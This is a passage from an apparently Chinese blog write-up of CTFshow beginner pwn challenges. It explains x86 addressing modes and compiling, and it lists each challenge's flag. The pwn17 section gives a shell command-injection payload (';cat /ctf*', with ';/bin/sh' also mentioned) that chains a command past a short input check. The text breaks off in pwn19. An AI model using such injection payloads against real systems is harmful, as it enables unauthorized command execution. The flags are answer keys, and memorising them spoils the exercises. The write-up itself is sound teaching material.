Addressing）</strong></p><p><strong>特点</strong>：操作数是寄存器。<br>​<strong>用途</strong>​：快速寄存器间数据传递。<br>​<strong>示例</strong>​：</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">mov ebx, 0x36d  ; ebx = 0x36d</span><br><span class="line">mov edx, ebx    ; edx = ebx</span><br></pre></td></tr></tbody></table></figure><p><strong>3. 直接寻址（Direct Addressing）</strong></p><p><strong>特点</strong>：操作数是内存地址（符号或绝对地址）。<br>​<strong>用途</strong>​：访问全局变量或静态数据。<br>​<strong>示例</strong>​：</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">mov ecx, msg    ; ecx = msg的地址（如 0x8049000）</span><br></pre></td></tr></tbody></table></figure><p><strong>4. 寄存器间接寻址（Register Indirect Addressing）</strong></p><p><strong>特点</strong>：操作数是寄存器指向的内存地址。<br>​<strong>用途</strong>​：通过指针访问内存。<br>​<strong>示例</strong>​：</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">mov esi, msg    ; esi = msg的地址</span><br><span class="line">mov eax, [esi]  ; eax = *esi（解引用）</span><br></pre></td></tr></tbody></table></figure><p>⚠️ 注意：<code>[]</code> 表示解引用（类似 C 语言的 <code>*</code>）。</p><p><strong>5. 寄存器相对寻址（Register Relative Addressing）</strong></p><p><strong>特点</strong>：寄存器 + 偏移量访问内存。<br>​<strong>用途</strong>​：访问数组或结构体成员。<br>​<strong>示例</strong>​：</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">mov ecx, msg    ; ecx = msg的地址</span><br><span class="line">add ecx, 4      ; ecx += 4（偏移4字节）</span><br><span class="line">mov eax, [ecx]  ; eax = *ecx</span><br></pre></td></tr></tbody></table></figure><p>相当于 <code>eax = msg[4]</code>（假设 <code>msg</code> 是字符数组）。</p><p><strong>6. 基址变址寻址（Base-Index Addressing）</strong></p><p><strong>特点</strong>：<code>基址寄存器 + 变址寄存器 * 比例因子</code>。<br>​<strong>用途</strong>​：高效访问多维数组或复杂数据结构。<br>​<strong>示例</strong>​：</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">mov ecx, msg      ; ecx = 基址（msg地址）</span><br><span class="line">mov edx, 2        ; edx = 变址（索引2）</span><br><span class="line">mov eax, [ecx + edx*2]  ; eax = *(ecx + edx*2)</span><br></pre></td></tr></tbody></table></figure><p>相当于 <code>eax = msg[edx*2]</code>（假设每个元素占2字节）。</p><p><strong>7. 相对基址变址寻址（Relative Base-Index Addressing）</strong></p><p><strong>特点</strong>：<code>基址寄存器 + 变址寄存器 * 比例因子 + 偏移量</code>。<br>​<strong>用途</strong>​：灵活访问内存中的复杂结构。<br>​<strong>示例</strong>​：</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">mov ecx, msg          ; ecx = 基址</span><br><span class="line">mov edx, 1            ; edx = 变址</span><br><span class="line">add ecx, 8            ; ecx += 8（基址偏移）</span><br><span class="line">mov eax, [ecx + edx*2 - 6]  ; eax = *(ecx + edx*2 - 6)</span><br></pre></td></tr></tbody></table></figure><p>相当于 <code>eax = msg[8 + edx*2 - 6]</code>。</p><p><strong>8. 系统调用中的寻址应用</strong></p><p>你的代码最后使用了 <strong>直接寻址</strong> 传递字符串地址：</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">mov eax, 4          ; sys_write 系统调用</span><br><span class="line">mov ebx, 1          ; stdout</span><br><span class="line">mov ecx, msg        ; 字符串地址（直接寻址）</span><br><span class="line">mov edx, 22         ; 字符串长度</span><br><span class="line">int 0x80</span><br></pre></td></tr></tbody></table></figure><p>这里 <code>msg</code> 是直接寻址，而 <code>edx</code> 是立即寻址。</p><p><strong>寻址方式对比表</strong></p><table><thead><tr><th>寻址方式</th><th>语法示例</th><th>等效 C 语言</th><th>典型用途</th></tr></thead><tbody><tr><td><strong>立即寻址</strong></td><td><code>mov eax, 11</code></td><td><code>eax = 11;</code></td><td>常数赋值</td></tr><tr><td><strong>寄存器寻址</strong></td><td><code>mov edx, ebx</code></td><td><code>edx = ebx;</code></td><td>寄存器间数据传递</td></tr><tr><td><strong>直接寻址</strong></td><td><code>mov ecx, msg</code></td><td><code>ecx = &amp;msg;</code></td><td>访问全局变量</td></tr><tr><td><strong>寄存器间接寻址</strong></td><td><code>mov eax, [esi]</code></td><td><code>eax = *esi;</code></td><td>指针解引用</td></tr><tr><td><strong>寄存器相对寻址</strong></td><td><code>mov eax, [ecx+4]</code></td><td><code>eax = *(ecx + 4);</code></td><td>数组/结构体访问</td></tr><tr><td><strong>基址变址寻址</strong></td><td><code>mov eax, [ecx+edx*2]</code></td><td><code>eax = *(ecx + edx*2);</code></td><td>多维数组访问</td></tr><tr><td><strong>相对基址变址寻址</strong></td><td><code>mov eax, [ecx+edx*2-6]</code></td><td><code>eax = *(ecx + edx*2 - 6);</code></td><td>复杂数据结构访问</td></tr></tbody></table><p><strong>为什么需要多种寻址方式？</strong></p><ol><li><strong>灵活性</strong>：适应不同数据结构（如数组、链表、结构体）。</li><li><strong>效率</strong>：基址变址寻址可减少指令数量（如循环遍历数组）。</li><li><strong>可读性</strong>：直接映射高级语言的内存访问模式。</li></ol><p><strong>常见问题</strong></p><p>Q1: 为什么 <code>mov eax, [msg]</code> 和 <code>mov eax, msg</code> 结果不同？</p><ul><li><code>mov eax, msg</code>：将 <code>msg</code> 的地址存入 <code>eax</code>。</li><li><code>mov eax, [msg]</code>：将 <code>msg</code> 地址处的 <strong>值</strong> 存入 <code>eax</code>（解引用）。</li></ul><p>Q2: 如何选择寻址方式？</p><ul><li>访问简单变量 → <strong>直接寻址</strong></li><li>通过指针访问 → <strong>寄存器间接寻址</strong></li><li>数组遍历 → <strong>基址变址寻址</strong></li></ul><p>掌握这些寻址方式是理解汇编和逆向工程的基础！ 🚀</p><hr><h2 id="10-pwn9"><a href="#10-pwn9" class="headerlink" title="10 pwn9"></a>10 pwn9</h2><p>🚩flag：<code>ctfshow{0x636C6557}</code></p><p>💡hint：<code>计组原理</code> <code>汇编基础</code></p><p>题目描述：寄存器间接寻址方式结束后eax寄存器的值为？</p><p>文件片段：</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">    msg db "Welcome_to_CTFshow_PWN", 0</span><br><span class="line"></span><br><span class="line">; 寄存器间接寻址方式</span><br><span class="line">    mov esi, msg        ; 将msg的地址赋值给esi</span><br><span class="line">    mov eax, [esi]      ; 将esi所指向的地址的值赋值给eax</span><br></pre></td></tr></tbody></table></figure><p>![截屏2025-08-11 15.41.48](/Users/serenius/Library/Application Support/typora-user-images/截屏2025-08-11 15.41.48.png)</p><p>![截屏2025-08-11 15.42.43](/Users/serenius/Library/Application Support/typora-user-images/截屏2025-08-11 15.42.43.png)</p><p>![image-20250811154831715](/Users/serenius/Library/Application Support/typora-user-images/image-20250811154831715.png)</p><hr><h2 id="11-pwn10"><a href="#11-pwn10" class="headerlink" title="11 pwn10"></a>11 pwn10</h2><p>🚩flag：<code>ctfshow{ome_to_CTFshow_PWN}</code></p><p>💡hint：<code>计组原理</code> <code>汇编基础</code></p><p>题目描述：寄存器相对寻址方式结束后eax寄存器的值为？</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">section .data</span><br><span class="line">    msg db "Welcome_to_CTFshow_PWN", 0</span><br><span class="line"></span><br><span class="line">section .text</span><br><span class="line">    global _start</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line"></span><br><span class="line">; 立即寻址方式</span><br><span class="line">    mov eax, 11         ; 将11赋值给eax</span><br><span class="line">    add eax, 114504     ; eax加上114504</span><br><span class="line">    sub eax, 1          ; eax减去1</span><br><span class="line"></span><br><span class="line">; 寄存器寻址方式</span><br><span class="line">    mov ebx, 0x36d      ; 将0x36d赋值给ebx</span><br><span class="line">    mov edx, ebx        ; 将ebx的值赋值给edx</span><br><span class="line"></span><br><span class="line">; 直接寻址方式</span><br><span class="line">    mov ecx, msg      ; 将msg的地址赋值给ecx</span><br><span class="line"></span><br><span class="line">; 寄存器间接寻址方式</span><br><span class="line">    mov esi, msg        ; 将msg的地址赋值给esi</span><br><span class="line">    mov eax, [esi]      ; 将esi所指向的地址的值赋值给eax</span><br><span class="line"></span><br><span class="line">; 寄存器相对寻址方式</span><br><span class="line">    mov ecx, msg        ; 将msg的地址赋值给ecx</span><br><span class="line">    add ecx, 4          ; 将ecx加上4</span><br><span class="line">    mov eax, [ecx]      ; 将ecx所指向的地址的值赋值给eax</span><br><span class="line"></span><br><span class="line">; 基址变址寻址方式</span><br><span class="line">    mov ecx, msg        ; 将msg的地址赋值给ecx</span><br><span class="line">    mov edx, 2          ; 将2赋值给edx</span><br><span class="line">    mov eax, [ecx + edx*2]  ; 将ecx+edx*2所指向的地址的值赋值给eax</span><br><span class="line"></span><br><span class="line">; 相对基址变址寻址方式</span><br><span class="line">    mov ecx, msg        ; 将msg的地址赋值给ecx</span><br><span class="line">    mov edx, 1          ; 将1赋值给edx</span><br><span class="line">    add ecx, 8          ; 将ecx加上8</span><br><span class="line">    mov eax, [ecx + edx*2 - 6]  ; 将ecx+edx*2-6所指向的地址的值赋值给eax</span><br><span class="line"></span><br><span class="line">; 输出字符串</span><br><span class="line">    mov eax, 4          ; 系统调用号4代表输出字符串</span><br><span class="line">    mov ebx, 1          ; 文件描述符1代表标准输出</span><br><span class="line">    mov ecx, msg        ; 要输出的字符串的地址</span><br><span class="line">    mov edx, 22         ; 要输出的字符串的长度</span><br><span class="line">    int 0x80            ; 调用系统调用</span><br><span class="line"></span><br><span class="line">; 退出程序</span><br><span class="line">    mov eax, 1          ; 系统调用号1代表退出程序</span><br><span class="line">    xor ebx, ebx        ; 返回值为0</span><br><span class="line">    int 0x80            ; 调用系统调用</span><br></pre></td></tr></tbody></table></figure><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">; 寄存器相对寻址方式</span><br><span class="line">    mov ecx, msg        ; 将msg的地址赋值给ecx</span><br><span class="line">    add ecx, 4          ; 将ecx加上4</span><br><span class="line">    mov eax, [ecx]      ; 将ecx所指向的地址的值赋值给eax</span><br></pre></td></tr></tbody></table></figure><p>这里将msg的地址（0x80490E8）+ 4 处所执向的地址的值赋给eax</p><p>0x80490E8+4=0x80490EC</p><p>ctfshow{ome_to_CTFshow_PWN}</p><hr><h2 id="12-pwn11"><a href="#12-pwn11" class="headerlink" title="12 pwn11"></a>12 pwn11</h2><p>🚩flag：<code>ctfshow{ome_to_CTFshow_PWN}</code></p><p>💡hint：<code>计组原理</code> <code>汇编基础</code></p><p>基址变址寻址方式结束后的eax寄存器的值为？</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">section .data</span><br><span class="line">    msg db "Welcome_to_CTFshow_PWN", 0</span><br><span class="line"></span><br><span class="line">section .text</span><br><span class="line">    global _start</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line"></span><br><span class="line">; 立即寻址方式</span><br><span class="line">    mov eax, 11         ; 将11赋值给eax</span><br><span class="line">    add eax, 114504     ; eax加上114504</span><br><span class="line">    sub eax, 1          ; eax减去1</span><br><span class="line"></span><br><span class="line">; 寄存器寻址方式</span><br><span class="line">    mov ebx, 0x36d      ; 将0x36d赋值给ebx</span><br><span class="line">    mov edx, ebx        ; 将ebx的值赋值给edx</span><br><span class="line"></span><br><span class="line">; 直接寻址方式</span><br><span class="line">    mov ecx, msg      ; 将msg的地址赋值给ecx</span><br><span class="line"></span><br><span class="line">; 寄存器间接寻址方式</span><br><span class="line">    mov esi, msg        ; 将msg的地址赋值给esi</span><br><span class="line">    mov eax, [esi]      ; 将esi所指向的地址的值赋值给eax</span><br><span class="line"></span><br><span class="line">; 寄存器相对寻址方式</span><br><span class="line">    mov ecx, msg        ; 将msg的地址赋值给ecx</span><br><span class="line">    add ecx, 4          ; 将ecx加上4</span><br><span class="line">    mov eax, [ecx]      ; 将ecx所指向的地址的值赋值给eax</span><br><span class="line"></span><br><span class="line">; 基址变址寻址方式</span><br><span class="line">    mov ecx, msg        ; 将msg的地址赋值给ecx</span><br><span class="line">    mov edx, 2          ; 将2赋值给edx</span><br><span class="line">    mov eax, [ecx + edx*2]  ; 将ecx+edx*2所指向的地址的值赋值给eax</span><br><span class="line"></span><br><span class="line">; 相对基址变址寻址方式</span><br><span class="line">    mov ecx, msg        ; 将msg的地址赋值给ecx</span><br><span class="line">    mov edx, 1          ; 将1赋值给edx</span><br><span class="line">    add ecx, 8          ; 将ecx加上8</span><br><span class="line">    mov eax, [ecx + edx*2 - 6]  ; 将ecx+edx*2-6所指向的地址的值赋值给eax</span><br><span class="line"></span><br><span class="line">; 输出字符串</span><br><span class="line">    mov eax, 4          ; 系统调用号4代表输出字符串</span><br><span class="line">    mov ebx, 1          ; 文件描述符1代表标准输出</span><br><span class="line">    mov ecx, msg        ; 要输出的字符串的地址</span><br><span class="line">    mov edx, 22         ; 要输出的字符串的长度</span><br><span class="line">    int 0x80            ; 调用系统调用</span><br><span class="line"></span><br><span class="line">; 退出程序</span><br><span class="line">    mov eax, 1          ; 系统调用号1代表退出程序</span><br><span class="line">    xor ebx, ebx        ; 返回值为0</span><br><span class="line">    int 0x80            ; 调用系统调用</span><br></pre></td></tr></tbody></table></figure><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">; 基址变址寻址方式</span><br><span class="line">    mov ecx, msg        ; 将msg的地址赋值给ecx</span><br><span class="line">    mov edx, 2          ; 将2赋值给edx</span><br><span class="line">    mov eax, [ecx + edx*2]  ; 将ecx+edx*2所指向的地址的值赋值给eax</span><br></pre></td></tr></tbody></table></figure><p>这里将msg的地址（0x80490E8) 复制给ecx</p><p>将2复制给edx，edx=2</p><p>eax=ecx+2*edx</p><p>=0x80490E8+4</p><p>=0x80490EC</p><p>ctfshow{ome_to_CTFshow_PWN}</p><hr><h2 id="13-pwn12"><a href="#13-pwn12" class="headerlink" title="13 pwn12"></a>13 pwn12</h2><p>🚩flag：<code>ctfshow{ome_to_CTFshow_PWN}</code></p><p>💡hint：<code>计组原理</code> <code>汇编基础</code></p><p>相对基址变址寻址方式结束后eax寄存器的值为？</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">section .data</span><br><span class="line">    msg db "Welcome_to_CTFshow_PWN", 0</span><br><span class="line"></span><br><span class="line">section .text</span><br><span class="line">    global _start</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line"></span><br><span class="line">; 立即寻址方式</span><br><span class="line">    mov eax, 11         ; 将11赋值给eax</span><br><span class="line">    add eax, 114504     ; eax加上114504</span><br><span class="line">    sub eax, 1          ; eax减去1</span><br><span class="line"></span><br><span class="line">; 寄存器寻址方式</span><br><span class="line">    mov ebx, 0x36d      ; 将0x36d赋值给ebx</span><br><span class="line">    mov edx, ebx        ; 将ebx的值赋值给edx</span><br><span class="line"></span><br><span class="line">; 直接寻址方式</span><br><span class="line">    mov ecx, msg      ; 将msg的地址赋值给ecx</span><br><span class="line"></span><br><span class="line">; 寄存器间接寻址方式</span><br><span class="line">    mov esi, msg        ; 将msg的地址赋值给esi</span><br><span class="line">    mov eax, [esi]      ; 将esi所指向的地址的值赋值给eax</span><br><span class="line"></span><br><span class="line">; 寄存器相对寻址方式</span><br><span class="line">    mov ecx, msg        ; 将msg的地址赋值给ecx</span><br><span class="line">    add ecx, 4          ; 将ecx加上4</span><br><span class="line">    mov eax, [ecx]      ; 将ecx所指向的地址的值赋值给eax</span><br><span class="line"></span><br><span class="line">; 基址变址寻址方式</span><br><span class="line">    mov ecx, msg        ; 将msg的地址赋值给ecx</span><br><span class="line">    mov edx, 2          ; 将2赋值给edx</span><br><span class="line">    mov eax, [ecx + edx*2]  ; 将ecx+edx*2所指向的地址的值赋值给eax</span><br><span class="line"></span><br><span class="line">; 相对基址变址寻址方式</span><br><span class="line">    mov ecx, msg        ; 将msg的地址赋值给ecx</span><br><span class="line">    mov edx, 1          ; 将1赋值给edx</span><br><span class="line">    add ecx, 8          ; 将ecx加上8</span><br><span class="line">    mov eax, [ecx + edx*2 - 6]  ; 将ecx+edx*2-6所指向的地址的值赋值给eax</span><br><span class="line"></span><br><span class="line">; 输出字符串</span><br><span class="line">    mov eax, 4          ; 系统调用号4代表输出字符串</span><br><span class="line">    mov ebx, 1          ; 文件描述符1代表标准输出</span><br><span class="line">    mov ecx, msg        ; 要输出的字符串的地址</span><br><span class="line">    mov edx, 22         ; 要输出的字符串的长度</span><br><span class="line">    int 0x80            ; 调用系统调用</span><br><span class="line"></span><br><span class="line">; 退出程序</span><br><span class="line">    mov eax, 1          ; 系统调用号1代表退出程序</span><br><span class="line">    xor ebx, ebx        ; 返回值为0</span><br><span class="line">    int 0x80            ; 调用系统调用</span><br></pre></td></tr></tbody></table></figure><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">; 相对基址变址寻址方式</span><br><span class="line">    mov ecx, msg        ; 将msg的地址赋值给ecx</span><br><span class="line">    mov edx, 1          ; 将1赋值给edx</span><br><span class="line">    add ecx, 8          ; 将ecx加上8</span><br><span class="line">    mov eax, [ecx + edx*2 - 6]  ; 将ecx+edx*2-6所指向的地址的值赋值给eax</span><br></pre></td></tr></tbody></table></figure><p>ecx=0x80490E8</p><p>edx=1</p><p>ecx=ecx+8</p><p>=0x80490E8+8</p><p>=0x80490F0</p><p>eax=ecx+edx*2-6</p><p>=0x80490F0-4</p><p>=0x80490EC</p><p>ctfshow{ome_to_CTFshow_PWN}</p><hr><h2 id="14-pwn13"><a href="#14-pwn13" class="headerlink" title="14 pwn13"></a>14 pwn13</h2><p>🚩flag：<code>ctfshow{hOw_t0_us3_GCC?}</code></p><p>💡hint：<code>二进制文件基础</code></p><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">gcc -o flag flag.c</span><br><span class="line">./flag</span><br></pre></td></tr></tbody></table></figure><p>![截屏2025-08-11 18.19.47](/Users/serenius/Library/Application Support/typora-user-images/截屏2025-08-11 18.19.47.png)</p><hr><h2 id="15-pwn14"><a href="#15-pwn14" class="headerlink" title="15 pwn14"></a>15 pwn14</h2><p>🚩flag：<code>ctfshow{01000011_01010100_01000110_01110011_01101000_01101111_01110111_00001010}</code></p><p>💡hint：<code>二进制文件基础</code></p><p>请你阅读以下源码，给定key为”CTFshow”，编译运行即可获得flag</p><figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BUFFER_SIZE 1024</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> {</span><br><span class="line">    FILE *fp;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> buffer[BUFFER_SIZE];</span><br><span class="line">    <span class="type">size_t</span> n;</span><br><span class="line">    fp = fopen(<span class="string">"key"</span>, <span class="string">"rb"</span>);</span><br><span class="line">    <span class="keyword">if</span> (fp == <span class="literal">NULL</span>) {</span><br><span class="line">        perror(<span class="string">"Nothing here!"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    }</span><br><span class="line">    <span class="type">char</span> output[BUFFER_SIZE * <span class="number">9</span> + <span class="number">12</span>]; </span><br><span class="line">    <span class="type">int</span> offset = <span class="number">0</span>;</span><br><span class="line">    offset += <span class="built_in">sprintf</span>(output + offset, <span class="string">"ctfshow{"</span>);</span><br><span class="line">    <span class="keyword">while</span> ((n = fread(buffer, <span class="keyword">sizeof</span>(<span class="type">unsigned</span> <span class="type">char</span>), BUFFER_SIZE, fp)) &gt; <span class="number">0</span>) {</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; n; i++) {</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">7</span>; j &gt;= <span class="number">0</span>; j--) {</span><br><span class="line">                offset += <span class="built_in">sprintf</span>(output + offset, <span class="string">"%d"</span>, (buffer[i] &gt;&gt; j) &amp; <span class="number">1</span>);</span><br><span class="line">            }</span><br><span class="line">            <span class="keyword">if</span> (i != n - <span class="number">1</span>) {</span><br><span class="line">                offset += <span class="built_in">sprintf</span>(output + offset, <span class="string">"_"</span>);</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">if</span> (!feof(fp)) {</span><br><span class="line">            offset += <span class="built_in">sprintf</span>(output + offset, <span class="string">" "</span>);</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">    offset += <span class="built_in">sprintf</span>(output + offset, <span class="string">"}"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%s\n"</span>, output);</span><br><span class="line">    fclose(fp);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>所以需要先写入key文件，然后编译运行文件。</p><p>![截屏2025-08-11 18.38.07](/Users/serenius/Library/Application Support/typora-user-images/截屏2025-08-11 18.38.07.png)</p><hr><h2 id="16-pwn15"><a href="#16-pwn15" class="headerlink" title="16 pwn15"></a>16 pwn15</h2><p>🚩flag：<code>ctfshow{@ss3mb1y_1s_3@sy}</code></p><p>💡hint：<code>二进制文件基础</code></p><p>编译汇编代码到可执行文件，即可拿到flag</p><p>这段代码是一个使用 x86 汇编语言编写的程序，用于在标准输出上打印一串特定格式的字符串。 要将这段代码编译为可执行文件，使用汇编器和链接器进行以下步骤：</p><p>使用以下命令将汇编代码编译为目标文件:</p> <figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">nasm -f elf flag.asm -o flag.o</span><br></pre></td></tr></tbody></table></figure><p>使用以下命令将目标文件链接为可执行文件：</p> <figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">ld -m elf_i386 -o flag flag.o</span><br></pre></td></tr></tbody></table></figure><p>运行此文件：</p> <figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">./flag</span><br></pre></td></tr></tbody></table></figure><img src="/Users/serenius/Library/Application Support/typora-user-images/截屏2025-08-11 18.44.53.png" alt="截屏2025-08-11 18.44.53" style="zoom:50%;"><hr><h2 id="17-pwn16"><a href="#17-pwn16" class="headerlink" title="17 pwn16"></a>17 pwn16</h2><p>🚩flag：<code>ctfshow{daniuniuda}</code></p><p>💡hint：<code>二进制文件基础</code></p><p>使用gcc将其编译为可执行文件</p><p><code>.s</code> 文件是汇编语言源文件的一种常见扩展名。它包含了使用汇编语言编写的程序代码。汇编语言是一种低级编程语言，用于直接操作计算机的指令集架构。 <code> .s</code> 文件通常由汇编器（Assembler）处</p><p>理，将其转换为可执行文件或目标文件。</p><p>可以使用 gcc 命令直接编译汇编语言源文件（<code>.s</code>文件）并将其链接为可执行文件。  gcc 命令具有适用于多种语言的编译器驱动程序功能，它可以根据输入文件的扩展名自动选择适当的编译器和链接器。</p><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">gcc -o flag flag.s</span><br><span class="line">./flag</span><br></pre></td></tr></tbody></table></figure><img src="/Users/serenius/Library/Application Support/typora-user-images/截屏2025-08-11 18.46.30.png" alt="截屏2025-08-11 18.46.30" style="zoom:50%;"><hr><h2 id="18-pwn17"><a href="#18-pwn17" class="headerlink" title="18 pwn17"></a>18 pwn17</h2><p>🚩flag：<code>ctfshow{8f284eaf-6fc1-4a4c-92ee-eca8a266d137}</code></p><p>💡hint：<code>二进制文件基础</code> <code>Linux基础命令的拼接</code></p><p>有些命令好像有点不一样？</p><p>不要一直等，可能那样永远也等不到flag</p><img src="/Users/serenius/Library/Application Support/typora-user-images/截屏2025-08-11 18.53.30.png" alt="截屏2025-08-11 18.53.30" style="zoom:50%;"><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">;<span class="built_in">cat</span> /ctf*</span><br></pre></td></tr></tbody></table></figure><p><strong>为什么Payload能工作？</strong></p><ol><li><strong>分号 <code>;</code> 的作用</strong>：</li></ol><ul><li>在Linux中，<code>;</code> 用于分隔多个命令，无论前一个命令是否成功。</li><li>例如：<code>command1 ; command2</code> 会依次执行 <code>command1</code> 和 <code>command2</code>。</li></ul><ol start="2"><li><strong>通配符 <code>\*</code> 的作用</strong>：</li></ol><ul><li><code>cat /ctf*</code> 会匹配所有以 <code>/ctf</code> 开头的文件（如 <code>/ctfshow_flag</code>）。</li></ul><ol start="3"><li><strong>输入长度限制（10字节）</strong>：</li></ol><ul><li><code>;cat /ctf*</code>（9字节）和 <code>;/bin/sh</code>（8字节）均满足长度限制。</li></ul><hr><h2 id="19-pwn18"><a href="#19-pwn18" class="headerlink" title="19 pwn18"></a>19 pwn18</h2><p>🚩flag：<code>ctfshow{02c7e220-25e0-45bf-a1e1-5f58604d9cc9}</code></p><p>💡hint：<code>二进制文件基础</code> <code>Linux基础命令的拼接</code> <code>逆向分析</code></p><p>仔细看看源码，或许有惊喜</p><p>假作真时真亦假，真作假时假亦真</p><figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">{</span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [rsp+4h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  setvbuf(_bss_start, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">1</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(s);</span><br><span class="line">  <span class="built_in">puts</span>(asc_B10);</span><br><span class="line">  <span class="built_in">puts</span>(asc_B90);</span><br><span class="line">  <span class="built_in">puts</span>(asc_C20);</span><br><span class="line">  <span class="built_in">puts</span>(asc_CB0);</span><br><span class="line">  <span class="built_in">puts</span>(asc_D38);</span><br><span class="line">  <span class="built_in">puts</span>(asc_DD0);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"    * *************************************                           "</span>);</span><br><span class="line">  <span class="built_in">puts</span>(aClassifyCtfsho);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"    * Type  : Linux_Security_Mechanisms                               "</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"    * Site  : https://ctf.show/                                       "</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"    * Hint  : Do you know redirect output ?                           "</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"    * *************************************                           "</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Which is the real flag?"</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%d"</span>, &amp;v4);</span><br><span class="line">  <span class="keyword">if</span> ( v4 == <span class="number">9</span> )</span><br><span class="line">    fake();</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    real();</span><br><span class="line">  system(<span class="string">"cat /ctfshow_flag"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>假作真时真亦假，输入9是假，那么就是真flag。</p><img src="/Users/serenius/Library/Application Support/typora-user-images/截屏2025-08-11 19.01.39.png" alt="截屏2025-08-11 19.01.39" style="zoom:50%;"><hr><h2 id="20-pwn19"><a href="#20-pwn19" class="headerlink" title="20 pwn19"></a>20 pwn19</h2><p>🚩flag：<code>ctfshow{37005897-483d-4287-aff4-8f5ab17ba35a}</code></p><p>💡hint：<code>二进制文件基础</code>  <code>逆向分析</code></p><p>关闭了输出流，一定是最安全的吗？</p><p>打开环境前先分析反编译源码：</p><figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">{</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">40</span>]; <span class="comment">// [rsp+10h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  setvbuf(_bss_start, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">1</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(s);</span><br><span class="line">  <span class="built_in">puts</span>(asc_BF0);</span><br><span class="line">  <span class="built_in">puts</span>(asc_C70);</span><br><span class="line">  <span class="built_in">puts</span>(asc_D00);</span><br><span class="line">  <span class="built_in">puts</span>(asc_D90);</span><br><span class="line">  <span class="built_in">puts</span>(asc_E18);</span><br><span class="line">  <span class="built_in">puts</span>(asc_EB0);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"    * *************************************                           "</span>);</span><br><span class="line">  <span class="built_in">puts</span>(aClassifyCtfsho);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"    * Type  : Linux_Security_Mechanisms                               